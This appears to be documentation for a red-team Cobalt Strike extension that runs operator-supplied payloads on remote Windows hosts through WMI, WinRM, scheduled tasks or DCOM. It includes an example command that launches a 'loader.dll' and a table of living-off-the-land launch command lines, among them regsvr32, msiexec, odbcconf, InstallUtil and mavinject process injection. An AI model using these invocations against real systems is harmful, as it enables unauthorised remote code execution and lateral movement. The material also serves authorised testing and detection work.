# Launcher contracts

`rex.cna` provides explicit launcher descriptors for `WMIExec`, `WSManExec`,
`TaskSchedExec`, and `DCOMIShellDispatch2`. There is no default launcher or
payload location. The operator supplies the payload type, absolute remote path,
and compatible launcher. The file must already exist on the target; neither the
CNA nor the BOF stages or removes it.

```text
rex launchers
rex wmi-exec --target 10.0.0.15 --payload-type dll \
  --remote-path C:\ProgramData\loader.dll \
  --launcher rundll32.exe --entry-point Run
```

Selectors containing spaces or parentheses must be quoted.

## Documentation

- [Authoring and validation](authoring.md)
- [Native DLL launchers](native.md)
- [Control Panel modules](cpl.md)
- [Managed .NET launchers](managed.md)
- [Process-bound injection](injection.md)
- [Custom launchers](custom.md)

## Built-in selectors

| Selector | Payload | Resolved invocation | Required payload contract |
| --- | --- | --- | --- |
| `rundll32.exe` | `dll` | `rundll32.exe REMOTE_PATH,ENTRY_POINT` | Export named by required `--entry-point` |
| `rundll32.exe (advpack RegisterOCX)` | `dll` | `rundll32.exe advpack.dll,RegisterOCX REMOTE_PATH` | `DllRegisterServer` |
| `msiexec.exe (/y)` | `dll` | `msiexec.exe /y REMOTE_PATH` | `DllRegisterServer` |
| `msiexec.exe (/z)` | `dll` | `msiexec.exe /z REMOTE_PATH` | `DllUnregisterServer` |
| `odbcconf.exe` | `dll` | `odbcconf.exe /a {REGSVR REMOTE_PATH}` | `DllRegisterServer` |
| `regsvr32.exe` | `dll` | `regsvr32.exe /s REMOTE_PATH` | `DllRegisterServer` |
| `regsvr32.exe (/u)` | `dll` | `regsvr32.exe /s /u REMOTE_PATH` | `DllUnregisterServer` |
| `regsvr32.exe (/i)` | `dll` | `regsvr32.exe /s /n /i REMOTE_PATH` | `DllInstall(TRUE, ...)` |
| `regsvr32.exe (/u /i)` | `dll` | `regsvr32.exe /s /u /n /i REMOTE_PATH` | `DllInstall(FALSE, ...)` |
| `control.exe` | `cpl` | `control.exe REMOTE_PATH` | Control Panel module exporting `CPlApplet` |
| `mavinject.exe` | `dll` | `mavinject.exe PROCESS_ID /INJECTRUNNING REMOTE_PATH` | Native DLL compatible with `--process-id` |
| `RegAsm.exe`, `RegAsm.exe (/U)` | `managed` | Framework64 `RegAsm.exe [/U] REMOTE_PATH` | COM-visible managed registration callbacks |
| `RegSvcs.exe`, `RegSvcs.exe (/U)` | `managed` | Framework64 `RegSvcs.exe [/U] REMOTE_PATH` | Strong-named Enterprise Services component |
| `InstallUtil.exe`, `InstallUtil.exe (/U)` | `managed` | Framework64 `InstallUtil.exe ... [/U] REMOTE_PATH` | Public `[RunInstaller(true)]` installer |

`--entry-point` is required only by standard `rundll32.exe` and custom
templates that contain `{entry_point}`. `mavinject.exe` and custom templates
that contain `{process_id}` require `--process-id`. `--launcher-program` may
override a built-in executable path, for example to select a 32-bit .NET
Framework tool or a `SysWOW64` launcher.

## Technique boundary

The launcher is resolved by the CNA into a program and arguments before the BOF
runs. `WMIExec` receives one complete command line. `WSManExec`,
`TaskSchedExec`, and `DCOMIShellDispatch2` receive a program and argument string
as separate technique values.

`rex preflight` checks the selected remote-execution technique. It does not
read the remote payload, inspect its metadata or exports, prove the launcher
exists, validate a process identifier, or test the rendered invocation. The
operator must perform those checks before execution.

## Evidence and recovery

Launcher-backed execution retains the evidence semantics of its technique:
`WMIExec`, Task Scheduler, and Shell automation report dispatch; `WSManExec`
waits for a command exit status and reports completion. Dispatch proves API
acceptance, not payload completion.

The BOF does not create a generic recovery record for launcher or payload side
effects. Wait until the launcher releases the module before removing the remote
file. Registration, installer, CPL, custom-launcher, and injected-DLL effects
require payload-specific recovery.

No launcher is quiet or undetectable. Remote-management telemetry can be
correlated with process creation, command lines, module loads, registration or
injection activity, and payload-defined side effects. Use the
[LOLBAS project](https://lolbas-project.github.io/) as a research catalog, not
as proof of compatibility or low observability.
